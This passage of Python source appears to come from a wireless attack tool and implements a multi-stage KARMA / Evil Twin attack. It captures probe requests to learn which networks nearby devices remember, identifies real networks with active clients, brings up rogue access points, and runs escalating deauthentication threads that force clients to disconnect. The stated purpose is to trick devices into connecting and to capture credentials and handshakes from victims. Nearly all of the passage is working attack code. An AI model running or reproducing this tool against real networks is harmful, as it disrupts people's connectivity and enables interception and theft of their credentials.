            result = subprocess.run(['iwconfig', interface, 'mode', 'monitor'], 
                                 capture_output=True, text=True, timeout=5)
            
            if result.returncode == 0:
                Color.pl('{+} {G}Successfully switched to monitor mode using iwconfig{W}')
                return True, interface
            else:
                Color.pl('{!} {O}iwconfig monitor mode failed: {O}%s{W}' % result.stderr.strip())
                
                # Try bringing interface down/up first
                Color.pl('{+} {C}Trying interface reset before monitor mode{W}')
                subprocess.run(['ifconfig', interface, 'down'], capture_output=True, timeout=5)
                time.sleep(1)
                subprocess.run(['ifconfig', interface, 'up'], capture_output=True, timeout=5)
                time.sleep(2)
                
                # Try iwconfig again
                result = subprocess.run(['iwconfig', interface, 'mode', 'monitor'], 
                                     capture_output=True, text=True, timeout=5)
                if result.returncode == 0:
                    Color.pl('{+} {G}Successfully switched to monitor mode after reset{W}')
                    return True, interface
                else:
                    Color.pl('{!} {O}iwconfig still failed after reset: {O}%s{W}' % result.stderr.strip())
            
            # Check if already in monitor mode
            result = subprocess.run(['iwconfig', interface], capture_output=True, text=True, timeout=3)
            if result.returncode == 0 and 'Mode:Monitor' in result.stdout:
                Color.pl('{+} {G}Interface is already in monitor mode{W}')
                return True, interface
            
            Color.pl('{!} {R}Failed to switch to monitor mode{W}')
            return False, interface
            
        except Exception as e:
            Color.pl('{!} {R}Error in fallback monitor mode: {O}%s{W}' % str(e))
            return False, interface
    
    def verify_interface_mode(self, interface, target_mode):
        """Dynamic verification of interface mode with smart interface detection"""
        try:
            Color.pl('{+} {C}Verifying interface mode for {G}%s{W}...{W}' % interface)
            
            # First, try to verify with the given interface name
            result = subprocess.run(['iwconfig', interface], capture_output=True, text=True, timeout=3)
            if result.returncode == 0:
                Color.pl('{+} {C}Debug: iwconfig output: {G}%s{W}' % result.stdout.strip())
                
                if target_mode == 'managed':
                    if 'Mode:Monitor' not in result.stdout:
                        Color.pl('{+} {G}✓ Interface {G}%s{O} is in managed mode{W}' % interface)
                        return True
                    else:
                        Color.pl('{!} {R}✗ Interface still in monitor mode{W}')
                elif target_mode == 'monitor':
                    if 'Mode:Monitor' in result.stdout:
                        Color.pl('{+} {G}✓ Interface {G}%s{O} is in monitor mode{W}' % interface)
                        return True
                    else:
                        Color.pl('{!} {R}✗ Interface not in monitor mode{W}')
                elif target_mode == 'master':
                    if 'Mode:Master' in result.stdout or 'Mode:AP' in result.stdout:
                        Color.pl('{+} {G}✓ Interface {G}%s{O} is in AP mode{W}' % interface)
                        return True
                    else:
                        Color.pl('{!} {R}✗ Interface not in AP mode{W}')
            else:
                Color.pl('{!} {R}✗ Could not get interface status for {G}%s{W}' % interface)
                Color.pl('{!} {O}Debug: iwconfig stderr: {O}%s{W}' % result.stderr.strip())
                
                # Dynamic interface detection - find the correct interface
                Color.pl('{+} {C}Attempting dynamic interface detection...{W}')
                actual_interface = self.find_correct_interface_for_verification(target_mode)
                
                if actual_interface and actual_interface != interface:
                    Color.pl('{+} {C}Found correct interface: {G}%s{W}' % actual_interface)
                    return self.verify_interface_mode(actual_interface, target_mode)
                else:
                    Color.pl('{!} {R}Could not find correct interface for verification{W}')
            
            # Fallback: Check if interface is at least UP and responsive
            Color.pl('{+} {C}Trying fallback verification...{W}')
            try:
                subprocess.run(['ifconfig', interface, 'up'], capture_output=True, timeout=3)
                time.sleep(1)
                
                # Test if interface responds
                test_result = subprocess.run(['iwconfig', interface], capture_output=True, text=True, timeout=3)
                if test_result.returncode == 0:
                    Color.pl('{+} {G}✓ Interface {G}%s{O} is responsive{W}' % interface)
                    # If we're trying to get managed mode and interface is responsive, accept it
                    if target_mode == 'managed':
                        Color.pl('{+} {G}✓ Interface appears to be in managed mode (responsive){W}')
                        return True
                else:
                    Color.pl('{!} {R}✗ Interface not responsive{W}')
                    Color.pl('{!} {O}Debug: fallback stderr: {O}%s{W}' % test_result.stderr.strip())
            except Exception as e:
                Color.pl('{!} {O}Fallback verification failed: {O}%s{W}' % str(e))
            
            Color.pl('{!} {R}Verification failed{W}')
            return False
            
        except Exception as e:
            Color.pl('{!} {R}Error in verify_interface_mode: {O}%s{W}' % str(e))
            return False
    
    def find_correct_interface_for_verification(self, target_mode):
        """Dynamically find the correct interface for verification"""
        try:
            Color.pl('{+} {C}Scanning system for correct interface...{W}')
            
            # Get all current interfaces
            current_interfaces = self.get_available_interfaces()
            if not current_interfaces:
                Color.pl('{!} {R}No interfaces found{W}')
                return None
            
            Color.pl('{+} {C}Found interfaces: {G}%s{W}' % ', '.join(current_interfaces))
            
            # Check each interface to find one in the target mode
            for interface in current_interfaces:
                try:
                    result = subprocess.run(['iwconfig', interface], capture_output=True, text=True, timeout=3)
                    if result.returncode == 0:
                        Color.pl('{+} {C}Checking interface {G}%s{W}: {O}%s{W}' % (interface, result.stdout.strip()))
                        
                        if target_mode == 'managed':
                            if 'Mode:Monitor' not in result.stdout:
                                Color.pl('{+} {G}Found managed interface: {G}%s{W}' % interface)
                                return interface
                        elif target_mode == 'monitor':
                            if 'Mode:Monitor' in result.stdout:
                                Color.pl('{+} {G}Found monitor interface: {G}%s{W}' % interface)
                                return interface
                except Exception as e:
                    Color.pl('{!} {O}Error checking interface %s: {O}%s{W}' % (interface, str(e)))
                    continue
            
            # If no interface found in target mode, return the first available one
            if current_interfaces:
                Color.pl('{+} {C}No interface found in target mode, using first available: {G}%s{W}' % current_interfaces[0])
                return current_interfaces[0]
            
            return None
            
        except Exception as e:
            Color.pl('{!} {R}Error in find_correct_interface_for_verification: {O}%s{W}' % str(e))
            return None
    
    def switch_interface_mode(self, target_mode, phase_name=""):
        """Unified interface mode switching for different attack phases"""
        try:
            interface = getattr(self, 'rogue_interface', None)
            if not interface:
                from ..gui.utils import SystemUtils
                interfaces = SystemUtils.get_wireless_interfaces()
                interface = interfaces[0] if interfaces else None
            
            # Clean up interface name to prevent wlan0monmon issues
            interface = self.cleanup_interface_name(interface)
            
            # Check if we have a valid interface
            if not interface:
                Color.pl('{!} {R}No interface available for mode switching{W}')
                return False
            
            if phase_name:
                Color.pl('{+} {C}%s: Switching interface to %s mode{W}' % (phase_name, target_mode))
            
            # Debug: Show current interface status
            Color.pl('{+} {C}Debug: Current interface: {G}%s{W}' % interface)
            current_state = self.get_interface_state(interface)
            Color.pl('{+} {C}Debug: Current state: {G}%s{W}' % current_state)
            
            # Kill conflicting processes first
            Color.pl('{+} {C}Cleaning up conflicting processes...{W}')
            subprocess.run(['pkill', '-f', 'hostapd'], capture_output=True)
            subprocess.run(['pkill', '-f', 'airmon'], capture_output=True)
            time.sleep(2)
            
            # Check NetworkManager status
            try:
                result = subprocess.run(['systemctl', 'is-active', 'NetworkManager'], 
                                      capture_output=True, text=True, timeout=2)
                if result.returncode == 0 and 'active' in result.stdout:
                    Color.pl('{!} {O}NetworkManager is running - may interfere{W}')
                else:
                    Color.pl('{+} {G}NetworkManager is not running - no conflict{W}')
            except:
                pass
            
            # Bring interface down
            try:
                subprocess.run(['ifconfig', interface, 'down'], capture_output=True, timeout=5)
                time.sleep(1)
            except Exception as e:
                Color.pl('{!} {O}Warning: Failed to bring interface down: {R}%s{W}' % str(e))
            
            # Set mode based on target
            if target_mode == 'managed':
                # For managed mode, use comprehensive switching approach
                success, actual_interface = self.switch_to_managed_mode(interface)
                if not success:
                    Color.pl('{!} {R}Failed to switch to managed mode{W}')
                    return False
                interface = actual_interface  # Use the actual interface name found
                    
            elif target_mode == 'monitor':
                # For monitor mode, use airmon-ng
                success, actual_interface = self.switch_to_monitor_mode(interface)
                if not success:
                    Color.pl('{!} {R}Failed to switch to monitor mode{W}')
                    return False
                interface = actual_interface  # Use the actual interface name found
            elif target_mode == 'master':
                # For master mode (AP mode), use iwconfig
                success = self.switch_to_master_mode(interface)
                if not success:
                    Color.pl('{!} {R}Failed to switch to master mode{W}')
                    return False
            else:
                Color.pl('{!} {R}Unknown target mode: %s{W}' % target_mode)
                return False
            
            # Bring interface back up
            try:
                subprocess.run(['ifconfig', interface, 'up'], capture_output=True, timeout=5)
                time.sleep(2)
            except Exception as e:
                Color.pl('{!} {O}Warning: Failed to bring interface up: {R}%s{W}' % str(e))
                # Try alternative method
                try:
                    subprocess.run(['ip', 'link', 'set', interface, 'up'], capture_output=True, timeout=5)
                    Color.pl('{+} {G}Interface brought up using alternative method{W}')
                except Exception as e2:
                    Color.pl('{!} {R}Failed to bring interface up with alternative method: {O}%s{W}' % str(e2))
            
            # Comprehensive verification of mode change
            return self.verify_interface_mode(interface, target_mode)
                
        except Exception as e:
            Color.pl('{!} {O}Error switching interface mode: {O}%s{W}' % str(e))
            return False
    
    def switch_to_master_mode(self, interface):
        """Switch interface to master mode (AP mode) for hostapd"""
        try:
            Color.pl('{+} {C}Switching to master mode (AP mode) for hostapd{W}')
            
            # If interface ends with 'mon', use the base interface for AP mode
            base_interface = interface
            if interface.endswith('mon'):
                base_interface = interface[:-3]  # Remove 'mon' suffix
                Color.pl('{+} {C}Using base interface {G}%s{W} for AP mode (from monitor interface {G}%s{W}){W}' % (base_interface, interface))
            
            # First, bring interface down
            subprocess.run(['ifconfig', base_interface, 'down'], capture_output=True, timeout=5)
            time.sleep(1)
            
            # Try modern 'iw' command first (preferred)
            result = subprocess.run(['iw', base_interface, 'set', 'type', '__ap'], 
                                  capture_output=True, text=True, timeout=10)
            
            if result.returncode == 0:
                Color.pl('{+} {G}Successfully set AP mode using iw{W}')
            else:
                # Fallback to iwconfig master mode
                Color.pl('{!} {O}iw failed, trying iwconfig master mode{W}')
                result = subprocess.run(['iwconfig', base_interface, 'mode', 'master'], 
                                      capture_output=True, text=True, timeout=10)
                
                if result.returncode != 0:
                    Color.pl('{!} {R}Failed to set master mode: {O}%s{W}' % result.stderr.strip())
                    return False
            
            # Bring interface back up
            subprocess.run(['ifconfig', base_interface, 'up'], capture_output=True, timeout=5)
            time.sleep(2)
            
            # Verify AP mode (check for both Master and AP modes)
            result = subprocess.run(['iwconfig', base_interface], capture_output=True, text=True, timeout=5)
            if result.returncode == 0 and ('Mode:Master' in result.stdout or 'Mode:AP' in result.stdout):
                Color.pl('{+} {G}Successfully switched to AP mode{W}')
                return True
            else:
                # Also try iw command for verification
                result = subprocess.run(['iw', base_interface, 'info'], capture_output=True, text=True, timeout=5)
                if result.returncode == 0 and 'type AP' in result.stdout:
                    Color.pl('{+} {G}Successfully switched to AP mode (verified with iw){W}')
                    return True
                else:
                    Color.pl('{!} {R}AP mode verification failed{W}')
                    Color.pl('{!} {O}iwconfig output: {O}%s{W}' % result.stdout.strip())
                    return False
                
        except Exception as e:
            Color.pl('{!} {R}Error switching to master mode: {O}%s{W}' % str(e))
            return False
    
    def stop_probe_capture(self):
        """Stop any active probe capture processes"""
        try:
            Color.pl('{+} {C}Stopping probe capture processes{W}')
            
            # Kill airodump processes
            subprocess.run(['pkill', '-f', 'airodump'], capture_output=True)
            
            # Kill tshark processes
            subprocess.run(['pkill', '-f', 'tshark'], capture_output=True)
            
            # Kill any other wireless monitoring processes
            subprocess.run(['pkill', '-f', 'airmon'], capture_output=True)
            
            # Give processes time to terminate
            time.sleep(2)
            
            Color.pl('{+} {G}Probe capture processes stopped{W}')
            return True
            
        except Exception as e:
            Color.pl('{!} {R}Error stopping probe capture: {O}%s{W}' % str(e))
            return False

    def get_additional_interfaces_for_aps(self):
        """Get additional interfaces for multiple APs"""
        try:
            additional = []
            used_interfaces = {self.probe_interface, self.rogue_interface}
            
            for interface in self.available_interfaces:
                if interface not in used_interfaces:
                    additional.append(interface)
            
            if additional:
                Color.pl('{+} {G}Found {C}%d{W} additional interfaces for multiple APs: {G}%s{W}' % 
                        (len(additional), ', '.join(additional)))
            
            return additional
            
        except Exception as e:
            Color.pl('{!} {R}Error getting additional interfaces: {O}%s{W}' % str(e))
            return []
    
    def show_interface_configuration(self):
        """Show the final interface configuration"""
        try:
            Color.pl('\n{+} {C}=== KARMA Interface Configuration ==={W}')
            Color.pl('{+} {C}Probe Interface:{W} {G}%s{W} (for capturing probe requests)' % self.probe_interface)
            Color.pl('{+} {C}Rogue Interface:{W} {G}%s{W} (for hosting Evil Twin AP)' % self.rogue_interface)
            
            if self.additional_interfaces:
                Color.pl('{+} {C}Additional Interfaces:{W} {G}%s{W} (for multiple APs)' % ', '.join(self.additional_interfaces))
            
            Color.pl('{+} {C}=== End Configuration ==={W}\n')
            
        except Exception as e:
            Color.pl('{!} {R}Error showing interface configuration: {O}%s{W}' % str(e))
        
    def run(self):
        """Main KARMA attack execution - Complete Multi-Stage Evil Twin Attack"""
        # Prevent duplicate execution
        if self._attack_started:
            Color.pl('{!} {R}KARMA attack already started - preventing duplicate execution{W}')
            return False
        
        self._attack_started = True
        
        # Ensure cleanup runs on exit/interrupts
        self._register_cleanup_handlers()
        try:
            Color.pl('\n{+} {C}Starting Enhanced KARMA Attack (Complete Evil Twin){W}')
            Color.pl('{+} {C}Probe Interface:{W} {G}%s{W}' % self.probe_interface)
            Color.pl('{+} {C}Rogue AP Interface:{W} {G}%s{W}' % self.rogue_interface)
            
            # Explain what KARMA does
            Color.pl('\n{+} {C}KARMA Attack Overview:{W}')
            Color.pl('{+} {C}This attack creates Evil Twin APs based on nearby devices, not just your selected target{W}')
            Color.pl('{+} {C}The attack will:{W}')
            Color.pl('  {G}1. Capture probe requests from nearby devices{W}')
            Color.pl('  {G}2. Find real networks with active clients{W}')
            Color.pl('  {G}3. Create Evil Twin APs to trick devices into connecting{W}')
            Color.pl('  {G}4. Capture credentials and handshakes from connected victims{W}')
            
            # Show user's selected target if available
            if hasattr(self, 'target') and self.target and self.target.essid:
                Color.pl('\n{+} {C}Your selected target: {G}%s{W} (will be prioritized if found during scanning){W}' % self.target.essid)
                Color.pl('{+} {O}Note: KARMA will still create Evil Twins for other networks to maximize effectiveness{W}')
            else:
                Color.pl('\n{+} {O}No specific target selected - KARMA will automatically choose the best networks{W}')
            
            # Use pattack for GUI logging integration
            if hasattr(self, 'target') and self.target:
                Color.pattack('KARMA', self.target, 'Starting Enhanced KARMA', 'Multi-Stage Evil Twin')
            
            # Check if we have optimal dual-interface setup
            if self.probe_interface == self.rogue_interface:
                Color.pl('{!} {O}Single interface mode detected - will use phase-based mode switching{W}')
                Color.pl('{!} {O}Phase 1-2: Monitor mode (probe capture){W}')
                Color.pl('{!} {O}Phase 3+: Managed mode (rogue AP) - will pause probe capture{W}')
                self.single_interface_mode = True
            else:
                Color.pl('{+} {G}Dual interface mode detected - optimal setup!{W}')
                Color.pl('{+} {G}Probe capture and rogue AP will run simultaneously{W}')
                Color.pl('{+} {G}Interface {C}%s{W}: Probe capture (monitor mode){W}' % self.probe_interface)
                Color.pl('{+} {G}Interface {C}%s{W}: Rogue AP (managed mode){W}' % self.rogue_interface)
                self.single_interface_mode = False
            
            # Stage 1: Passive PNL Capture
            if hasattr(self, 'target') and self.target:
                Color.pattack('KARMA', self.target, 'Stage 1', 'Capturing PNL data')
            if not self.capture_probe_requests():
                Color.pl('{!} {R}Failed to capture sufficient probe requests{W}')
                # Try fallback attack mode
                Color.pl('{+} {O}Attempting fallback attack mode...{W}')
                if not self.fallback_attack_mode():
                    Color.pl('{!} {R}Fallback attack mode also failed{W}')
                    self.cleanup()
                    return False
                else:
                    Color.pl('{+} {G}Fallback attack mode activated{W}')
                    self._fallback_mode_used = True
            
            # Stage 2: Identify Real Networks with Clients (skip if fallback already handled this)
            if not self._fallback_mode_used:
                if hasattr(self, 'target') and self.target:
                    Color.pattack('KARMA', self.target, 'Stage 2', 'Scanning for real networks')
                if not self.identify_real_networks():
                    Color.pl('{!} {R}No real networks with clients found{W}')
                    # Try fallback attack mode
                    Color.pl('{+} {O}Attempting fallback attack mode...{W}')
                    if not self.fallback_attack_mode():
                        Color.pl('{!} {R}Fallback attack mode also failed{W}')
                        self.cleanup()
                        return False
                    else:
                        Color.pl('{+} {G}Fallback attack mode activated{W}')
                        self._fallback_mode_used = True
            else:
                Color.pl('{+} {G}Skipping Stage 2 - already handled by fallback mode{W}')
            
            # Stage 3: Setup Evil Twin Infrastructure
            if self.single_interface_mode:
                # Single interface: Switch to rogue AP mode
                if not self.switch_interface_mode('master', 'Rogue AP Setup'):
                    Color.pl('{!} {R}Failed to switch to rogue AP mode{W}')
                    self.cleanup()
                    return False
            else:
                # Dual interface: Setup rogue AP on separate interface
                Color.pl('{+} {C}Setting up rogue AP on separate interface {G}%s{W}...{W}' % self.rogue_interface)
                
            if hasattr(self, 'target') and self.target:
                Color.pattack('KARMA', self.target, 'Stage 3', 'Setting up Evil Twin')
            if not self.setup_rogue_ap():
                Color.pl('{!} {R}Failed to setup Evil Twin infrastructure{W}')
                self.cleanup()
                return False
            
            # Phase 3: DNS Spoofing Setup (if enabled)
            Color.pl('\n{+} {C}Phase 3: DNS Spoofing Setup{W}')
            if Configuration.karma_dns_spoofing:
                Color.pl('{+} {G}DNS spoofing enabled - setting up DNS server{W}')
                Color.pl('{!} {O}DNS spoofing functionality not yet implemented{W}')
                Color.pl('{!} {O}Continuing with Layer 2 KARMA attack only{W}')
            else:
                Color.pl('{+} {O}DNS spoofing disabled - running Layer 2 KARMA only{W}')
            
            # Stage 4: Deauthentication Attack
            if hasattr(self, 'target') and self.target:
                Color.pattack('KARMA', self.target, 'Stage 4', 'Starting deauth attack')
            if not self.start_deauth_attack():
                Color.pl('{!} {R}Failed to start deauthentication attack{W}')
                self.cleanup()
                return False
            
            # Stage 5: Handshake Capture & Monitoring
            if hasattr(self, 'target') and self.target:
                Color.pattack('KARMA', self.target, 'Stage 5', 'Handshake capture active')
            self.start_handshake_capture()
            
            # Stage 6: Complete Monitoring & Analysis
            if hasattr(self, 'target') and self.target:
                Color.pattack('KARMA', self.target, 'Stage 6', 'Full monitoring active')
            
            if self.single_interface_mode:
                self.start_monitoring()
            else:
                self.start_dual_interface_monitoring()
            
        except Exception as e:
            Color.pl('{!} {R}Enhanced KARMA attack failed: {O}%s{W}' % str(e))
            self.cleanup()
            return False
        finally:
            self.cleanup()
            
        return self.success

    def _register_cleanup_handlers(self):
        """Register atexit and signal handlers to guarantee cleanup"""
        def _safe_cleanup(signum=None, frame=None):
            try:
                self.cleanup()
            except Exception:
                pass
        try:
            atexit.register(_safe_cleanup)
        except Exception:
            pass
        # Best-effort signal hooks
        for sig in (getattr(signal, 'SIGINT', None), getattr(signal, 'SIGTERM', None)):
            if sig is None:
                continue
            try:
                signal.signal(sig, _safe_cleanup)
            except Exception:
                pass
    
    def capture_probe_requests(self):
        """Capture probe requests to extract PNL"""
        Color.pl('\n{+} {C}Phase 1: Capturing probe requests to extract PNL{W}')
        
        # Use airodump to capture probe requests (without -a flag to capture all frames)
        with Airodump(interface=self.probe_interface, 
                     output_file_prefix='karma_probes',
                     delete_existing_files=True) as airodump:
            
            # Use timeout from GUI settings (respect user's choice)
            probe_timeout = Configuration.karma_probe_timeout
            timer = Timer(probe_timeout)
            Color.pl('{+} {C}Capturing probe requests for {G}%d{W} seconds...' % probe_timeout)
            
            while not timer.ended() and self.running:
                # Parse captured packets for probe requests
                cap_files = airodump.find_files(endswith='.cap')
                if cap_files:
                    self.parse_probe_requests(cap_files[0])
                
                # Show progress
                if len(self.pnl_networks) > 0:
                    Color.clear_entire_line()
                    Color.p('{+} {C}Captured {G}%d{W} unique SSIDs from probe requests...' % len(self.pnl_networks))
                    
                    # GUI logging
                    if hasattr(self, 'target') and self.target:
                        Color.pattack('KARMA', self.target, 'PNL Capture', f'Found {len(self.pnl_networks)} SSIDs')
                
                time.sleep(2)
            
            Color.pl('')  # New line after progress
            
            if len(self.pnl_networks) >= Configuration.karma_min_probes:
                Color.pl('{+} {G}Successfully captured {C}%d{W} networks from PNL{W}' % len(self.pnl_networks))
                for ssid in sorted(self.pnl_networks):
                    Color.pl('  {G}* {W}%s' % ssid)
                
                # GUI logging for phase completion
                if hasattr(self, 'target') and self.target:
                    Color.pattack('KARMA', self.target, 'PNL Capture', f'Complete - {len(self.pnl_networks)} networks captured')
                
                return True
            else:
                Color.pl('{!} {R}Only captured {O}%d{W} probe requests, need at least {O}%d{W}' % 
                        (len(self.pnl_networks), Configuration.karma_min_probes))
                return False
    
    def parse_probe_requests(self, capfile):
        """Parse probe requests from PCAP file using tshark"""
        if not Tshark.exists():
            Color.pl('{!} {R}Warning: tshark not found, cannot parse probe requests{W}')
            return
        
        try:
            # Use tshark to extract probe requests with better filtering
            command = [
                'tshark',
                '-r', capfile,
                '-n',  # Don't resolve addresses
                '-Y', 'wlan.fc.type_subtype == 0x04 and wlan.ssid != ""',  # Probe request frames with SSID
                '-T', 'fields',
                '-e', 'wlan.sa',  # Source MAC
                '-e', 'wlan.ssid'  # SSID
            ]
            
            process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            stdout, stderr = process.communicate()
            
            if process.returncode != 0:
                if Configuration.verbose > 1:
                    Color.pl('{!} {R}tshark error: {O}%s{W}' % stderr.strip())
                return
            
            parsed_count = 0
            for line in stdout.split('\n'):
                line = line.strip()
                if not line or '\t' not in line:
                    continue
                
                parts = line.split('\t')
                if len(parts) >= 2:
                    client_mac = parts[0].strip()
                    ssid = parts[1].strip()
                    
                    # Validate MAC address format
                    if not self.is_valid_mac(client_mac):
                        continue
                    
                    if client_mac and ssid and ssid != '' and ssid != '<MISSING>':
                        # Convert hex-encoded SSIDs to readable text
                        readable_ssid = self.decode_hex_ssid(ssid)
                        
                        # Skip empty or invalid SSIDs
                        if readable_ssid and len(readable_ssid.strip()) > 0:
                            self.client_probes[client_mac].append(readable_ssid)
                            self.pnl_networks.add(readable_ssid)
                            parsed_count += 1
            
            if parsed_count > 0 and Configuration.verbose > 1:
                Color.pl('{+} {G}Parsed {C}%d{W} probe requests{W}' % parsed_count)
                        
        except Exception as e:
            if Configuration.verbose > 1:
                Color.pl('{!} {R}Error parsing probe requests: {O}%s{W}' % str(e))
    
    def is_valid_mac(self, mac):
        """Check if MAC address is valid"""
        try:
            if not mac or len(mac) != 17:
                return False
            
            # Check format: XX:XX:XX:XX:XX:XX
            parts = mac.split(':')
            if len(parts) != 6:
                return False
            
            for part in parts:
                if len(part) != 2:
                    return False
                try:
                    int(part, 16)
                except ValueError:
                    return False
            
            return True
        except:
            return False
    
    def identify_real_networks(self):
        """Identify real networks with active clients for deauth targeting"""
        Color.pl('\n{+} {C}Stage 2: Identifying real networks with active clients{W}')
        
        try:
            # Use airodump to scan for networks with clients
            with Airodump(interface=self.probe_interface,
                         output_file_prefix='karma_real_networks',
                         delete_existing_files=True) as airodump:
                
                timer = Timer(15)  # Increased to 15 seconds for better client detection
                Color.pl('{+} {C}Scanning for real networks with clients...{W}')
                
                # Monitor progress and show updates
                last_update = 0
                while not timer.ended() and self.running:
                    time.sleep(2)
                    
                    # Show progress every 5 seconds
                    if time.time() - last_update >= 5:
                        remaining = timer.remaining()
                        Color.pl('{+} {C}Scanning... {O}%d{W} seconds remaining{W}' % remaining)
                        last_update = time.time()
                
                # Get discovered targets
                targets = airodump.get_targets()
                Color.pl('{+} {C}Parsed {G}%d{W} total networks from scan{W}' % len(targets))
                
                # Filter for networks with clients
                networks_with_clients = []
                for target in targets:
                    if target.clients and target.essid_known and target.essid:
                        # Only target networks that have clients and known SSIDs
                        networks_with_clients.append(target)
                        self.real_networks.append(target)
                        Color.pl('{+} {G}Found real network: {C}%s{W} ({C}%s{W}) with {G}%d{W} clients{W}' % 
                                (target.essid, target.bssid, len(target.clients)))
                        
                        # Show clients
                        for client in target.clients:
                            Color.pl('  {G}* {W}Client: {C}%s{W}' % client.bssid)
                
                # Also check for unassociated clients (probe requests)
                unassociated_targets = [t for t in targets if t.bssid == 'UNASSOCIATED' and t.clients]
                if unassociated_targets:
                    unassociated_target = unassociated_targets[0]
                    Color.pl('{+} {C}Found {G}%d{W} unassociated clients (probe requests){W}' % len(unassociated_target.clients))
                    for client in unassociated_target.clients:
                        Color.pl('  {G}* {W}Unassociated: {C}%s{W}' % client.station)
                
                # Mark that networks have been scanned
                self._networks_scanned = True
                
                if self.real_networks:
                    Color.pl('{+} {G}Found {C}%d{W} real networks with clients for targeting{W}' % len(self.real_networks))
                    
                    # GUI logging for phase completion
                    if hasattr(self, 'target') and self.target:
                        Color.pattack('KARMA', self.target, 'Network Scan', f'Complete - {len(self.real_networks)} networks with clients found')
                    
                    return True
                else:
                    Color.pl('{!} {R}No real networks with clients found{W}')
                    Color.pl('{!} {O}This may be due to:{W}')
                    Color.pl('{!} {O}  - No active clients in the area{W}')
                    Color.pl('{!} {O}  - Clients are on different channels{W}')
                    Color.pl('{!} {O}  - Scan duration too short{W}')
                    Color.pl('{!} {O}  - Interface not properly configured{W}')
                    return False
                    
        except Exception as e:
            Color.pl('{!} {R}Error identifying real networks: {O}%s{W}' % str(e))
            import traceback
            if Configuration.verbose > 1:
                Color.pl('{!} {R}Debug traceback:{W}')
                Color.pl(traceback.format_exc())
            return False
    
    def start_deauth_attack(self):
        """Start adaptive deauthentication attack to force clients to disconnect"""
        Color.pl('\n{+} {C}Stage 4: Starting adaptive deauthentication attack{W}')
        
        try:
            self.deauth_active = True
            self.deauth_attempts = {}  # Track attempts per network
            self.deauth_intensity = {}  # Track attack intensity per network
            
            if not self.real_networks:
                Color.pl('{!} {R}No real networks to target{W}')
                return False
            
            Color.pl('{+} {C}Targeting {G}%d{W} real networks with adaptive deauth packets{W}' % len(self.real_networks))
            Color.pl('{+} {C}Attack will escalate intensity if clients don\'t connect{W}')
            
            # Start adaptive deauth threads for each network
            deauth_threads = []
            for network in self.real_networks:
                self.deauth_attempts[network.bssid] = 0
                self.deauth_intensity[network.bssid] = 1  # Start with intensity 1
                
                thread = threading.Thread(target=self.adaptive_deauth_network_clients, args=(network,))
                thread.daemon = True
                thread.start()
                deauth_threads.append(thread)
                
                if hasattr(self, 'target') and self.target:
                    Color.pattack('KARMA', self.target, 'Adaptive Deauth', f'Targeting {network.essid}')
            
            Color.pl('{+} {G}Adaptive deauthentication attack active - forcing clients to disconnect{W}')
            return True
            
        except Exception as e:
            Color.pl('{!} {R}Error starting deauth attack: {O}%s{W}' % str(e))
            return False
    
    def adaptive_deauth_network_clients(self, network):
        """Send adaptive deauth packets with balanced approach - give clients time to connect"""
        try:
            Color.pl('{+} {C}Starting adaptive deauth attack on {G}%s{W} ({C}%s{W}){W}' % 
                    (network.essid, network.bssid))
            
            deauth_count = 0
            last_connection_check = time.time()
            no_connection_duration = 0
            last_deauth_time = 0
            deauth_interval = 10  # Start with 10 second intervals between deauth rounds
            
            while self.deauth_active and self.running:
                current_time = time.time()
                
                # Check if we have any connected clients (every 30 seconds)
                if current_time - last_connection_check >= 30:
                    connected_clients = len(self.connected_clients)
                    last_connection_check = current_time
                    
                    if connected_clients == 0:
                        no_connection_duration += 30
                        # Escalate attack intensity if no clients connected
                        self.escalate_deauth_intensity(network, no_connection_duration)
                        # Reduce deauth interval for more aggressive attacks
                        deauth_interval = max(5, 15 - (no_connection_duration // 30))
                    else:
                        no_connection_duration = 0  # Reset if clients connected
                        self.deauth_intensity[network.bssid] = max(1, self.deauth_intensity[network.bssid] - 1)  # Reduce intensity
                        # Increase deauth interval when clients are connected
                        deauth_interval = min(20, deauth_interval + 2)
                
                # Only send deauth packets at intervals to give clients time to connect
                if current_time - last_deauth_time >= deauth_interval:
                    last_deauth_time = current_time
                    
                    # Send deauth packets based on current intensity
                    intensity = self.deauth_intensity[network.bssid]
                    packets_per_round = min(intensity * 2, 10)  # Reduced max packets per round
                    
                    for client in network.clients:
                        try:
                            # Send fewer deauth packets to avoid overwhelming
                            for i in range(packets_per_round):
                                self.send_adaptive_deauth(network, client, intensity)
                                deauth_count += 1
                                
                                # Longer delay between packets
                                time.sleep(0.2)
                            
                            # Log deauth activity every 10 packets (reduced frequency)
                            if deauth_count % 10 == 0:
                                Color.pl('{+} {C}Deauth sent to {G}%s{W} - waiting {G}%d{W}s for connections' % 
                                        (network.essid, deauth_interval))
                            
                        except Exception as e:
                            if Configuration.verbose > 1:
                                Color.pl('{!} {R}Deauth failed for {G}%s{W}: {O}%s{W}' % 
                                        (client.bssid, str(e)))
                
                # Longer sleep to give clients time to connect
                sleep_time = max(5, deauth_interval)  # Minimum 5 second sleep
                time.sleep(sleep_time)
                
        except Exception as e:
            if Configuration.verbose > 1:
                Color.pl('{!} {R}Error in adaptive deauth thread: {O}%s{W}' % str(e))
    
    def escalate_deauth_intensity(self, network, no_connection_duration):
        """Escalate deauth attack intensity based on time without connections"""
        try:
            current_intensity = self.deauth_intensity[network.bssid]
            
            # Escalate intensity based on time without connections
            if no_connection_duration >= 60 and current_intensity < 3:  # After 1 minute
                self.deauth_intensity[network.bssid] = 3
                Color.pl('{+} {O}Escalating deauth intensity to {G}3{W} for {G}%s{W} (no connections for 60s)' % network.essid)
            elif no_connection_duration >= 120 and current_intensity < 5:  # After 2 minutes
                self.deauth_intensity[network.bssid] = 5
                Color.pl('{+} {R}Escalating deauth intensity to {G}5{W} for {G}%s{W} (no connections for 120s)' % network.essid)
            elif no_connection_duration >= 180 and current_intensity < 7:  # After 3 minutes
                self.deauth_intensity[network.bssid] = 7
                Color.pl('{+} {R}Maximum deauth intensity {G}7{W} for {G}%s{W} (no connections for 180s)' % network.essid)
            
        except Exception as e:
            if Configuration.verbose > 1:
                Color.pl('{!} {R}Error escalating deauth intensity: {O}%s{W}' % str(e))
    
    def fallback_attack_mode(self):
        """Fallback attack mode when probe capture fails"""
        try:
            Color.pl('{+} {O}Activating fallback attack mode...{W}')
            Color.pl('{+} {C}This mode will use common SSIDs and aggressive deauth{W}')
            
            # Create fallback PNL with common SSIDs
            self.pnl_networks = {
                'linksys', 'netgear', 'dlink', 'belkin', 'asus', 'tp-link',
                'wifi', 'wireless', 'internet', 'home', 'office', 'guest',
